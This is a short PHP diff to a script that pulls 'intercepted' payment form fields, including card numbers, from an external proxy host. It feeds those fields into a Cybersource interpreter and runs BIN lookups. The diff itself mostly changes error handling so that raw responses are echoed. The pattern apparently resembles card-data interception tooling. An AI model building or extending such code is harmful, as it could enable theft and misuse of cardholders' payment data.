@@ -6,7 +6,6 @@ $json = json_encode($data);
 $base64 = base64_encode($json);
 $url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);
 
-// Fetch from Cybersource proxy
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
@@ -15,35 +14,39 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 $error = curl_error($ch);
 curl_close($ch);
 
-// Fail on cURL error
+// If cURL failed
 if ($error) {
-    echo json_encode(['success' => false, 'error' => 'Curl error: ' . $error]);
+    echo json_encode([
+        'success' => false,
+        'error' => "Curl error: $error",
+        'raw_response' => $response
+    ]);
     exit;
 }
 
-// Try decoding
+// Try decode
 $parsed = json_decode($response, true);
 
-// Fail on invalid JSON
-if (!$parsed || !isset($parsed['intercepted'][0]['fields'])) {
+// If not JSON, return raw content for debugging
+if (json_last_error() !== JSON_ERROR_NONE || !isset($parsed['intercepted'][0]['fields'])) {
     echo json_encode([
         'success' => false,
-        'error' => 'Unexpected token or invalid JSON structure',
+        'error' => 'Full response is not valid JSON or expected format',
+        'json_error' => json_last_error_msg(),
         'http_code' => $httpCode,
         'raw_response' => $response
     ]);
     exit;
 }
 
+// Normal flow continues here if JSON is valid
 $fields = $parsed['intercepted'][0]['fields'];
-
-// Interpret Cybersource response
 $_POST = $fields;
 ob_start();
 include 'cybersrc.php';
 $interpreted = json_decode(ob_get_clean(), true);
 
-// Lookup BIN data
+// Get BIN info
 $bin = substr(preg_replace('/\\D/', '', $fields['card_number'] ?? ''), 0, 6);
 $binData = [];
 if ($bin) {
@@ -57,7 +60,6 @@ if ($bin) {
     curl_close($ch);
 }
 
-// Return combined interpretation
 echo json_encode([
     'success' => true,
     'cybersource_interpretation' => $interpreted,
